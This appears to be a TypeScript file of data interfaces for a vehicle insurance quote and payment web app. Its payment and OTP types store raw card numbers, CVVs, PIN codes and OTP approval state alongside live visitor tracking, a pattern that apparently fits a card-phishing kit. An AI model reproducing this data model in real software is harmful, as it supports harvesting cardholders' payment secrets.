// ============================================
// ALL DATA INTERFACES
// ============================================

// === INSURANCE FORM DATA ===
export interface InsuranceFormData {
  insurance_purpose: "renewal" | "property-transfer";
  vehicle_type: "registration" | "customs";
  documment_owner_full_name: string;
  owner_identity_number?: string;
  buyer_identity_number?: string;
  seller_identity_number?: string;
  phone?: string;
  serial_number?: string;
  vehicle_manufacture_number?: string;
  customs_code?: string;
  agreeToTerms: boolean;
}

export type FormErrors = Partial<Record<keyof InsuranceFormData, string>>;

// === EXTRA FEATURE ===
export interface ExtraFeature {
  id?: string;
  content: string;
  price: number;
  offer_id?: string;
}

// === EXTRA EXPENSE ===
export interface ExtraExpense {
  id?: string;
  reason: string;
  price: number;
  offer_id?: string;
}

// === COMPANY ===
export interface Company {
  id: string;
  name: string;
  image_url: string;
  created_at?: string;
  updated_at?: string;
}

// === OFFER ===
export interface Offer {
  id: string;
  companyId?: string;
  company_id?: string;
  name: string;
  type: string;
  main_price: number | string;
  extra_features: ExtraFeature[];
  extra_expenses: ExtraExpense[];
  company?: Company;
  created_at?: string;
  updated_at?: string;
}

// === PAYMENT FORM DATA ===
export interface PaymentFormData {
  id: string;
  full_name: string;
  card_number: string;
  expiration_date: string;
  cvv: string;
}

// === CARD TYPE ===
export interface CardType {
  type: string;
  logo: string;
  name: string;
}

// === VISITOR DATA ===
export interface VisitorData {
  id: string;
  currentPage?: number;
  isOnline?: boolean;
  lastSeen?: string;
  created_at?: string;
}

// === OTP DATA ===
export interface OtpData {
  id: string;
  otp?: string;
  otpApproved?: boolean;
  otpAttempts?: number;
  pinCode?: string;
}

// === QUOTE FORM DATA ===
export interface QuoteFormData {
  insurance_purpose: "renewal" | "property-transfer";
  documment_owner_full_name: string;
  owner_identity_number: string;
  buyer_identity_number: string;
  seller_identity_number: string;
  vehicle_type: string;
  sequenceNumber: string;
  policyStartDate: string;
  insuranceTypeSelected: string;
  additionalDrivers: number;
  specialDiscounts: boolean;
  agreeToTerms: boolean;
  selectedInsuranceOffer: string;
  selectedAddons: string[];
  phone: string;
}

// === VALIDATION RULE ===
export interface ValidationRule {
  required?: boolean;
  pattern?: RegExp;
  message: string;
  validate?: (value: string) => string | null;
}
